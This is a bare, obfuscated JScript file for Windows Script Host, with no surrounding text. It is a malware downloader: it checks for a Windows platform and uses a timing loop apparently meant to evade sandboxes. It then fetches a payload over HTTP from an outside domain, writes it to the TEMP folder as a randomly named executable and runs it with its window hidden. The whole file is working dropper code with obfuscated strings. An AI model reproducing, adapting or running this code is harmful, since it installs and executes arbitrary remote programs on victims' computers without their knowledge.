var pH = false;
var np = "CreateObject";
var J = function dR() {return WScript[np]("WScript.Shell");}(), ZV = 11;
var t = "MSXML2.XMLHTTP";
var fQ = 2123213;
var v = 0;
function eS(pI){J["Run"](pI, v, v);};
function i(){return "" + t;};
function P(p, af){v = v * 1; return p - af;};
function td(){return np;};
/*@cc_on
  @if (@_win32 || @_win64)
    pH = true;
  @end
@*/
if (pH)
{
var Dv = "";
function l(){return 22;};
var bs = 0; var hT = 0;
function kb()
{
var l0 = new this["Date"]();
var XX = l0["getUTCMilliseconds"]();
WScript["Sleep"](l());
var l0 = new this["Date"]();
var uJ = l0["getUTCMilliseconds"]();
WScript["Sleep"](l());
var l0 = new this["Date"]();
var x = l0["getUTCMilliseconds"]();
var bs = "L";
bs = P(uJ, XX);
var hT = "D";
hT = P(x, uJ);
Dv = "open";
return P(bs, hT);
}
var U = false;
var f = false;
for (var k = v; k < l() * 1; k++){if (kb() != v){
U = true; 
hT = "31" + 11 * bs + hT; 
f = true; 
break;
}}
function hq() {return ((U == true) && (U == f)) ? 1 : v;};
if (U && hq() && f){
function pJ() {return J["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WY5rBg9AgDXyQe.exe";};
 Bs = i();
 OU = WScript[np](Bs);
 var V = 1;
 while (V){
try {
OU[Dv]("GET", "http://www.the2ndedit.com/j1oisa", false);
OU["send"]();
z0 = "Sleep";
for (;;){WScript[z0](l() * 11); if (OU["readystate"] >= 2 * 2) break;};
V = v;
} catch(G){};
}
function g(Cn) {var z = (1, 2, 3, 4, 5, Cn); return z;};
P0 = WScript[td()]("ADODB.Stream");
Bs = P0;
Bs[Dv]();
Bs["type"] = g(1);
Bs["write"](OU["ResponseBody"]);
P0["position"] = g(v);
Bs["Save" + "ToFile"](pJ(), 2);
P0["c"+"lose"]();
S = pJ();
eS(S);
}
}

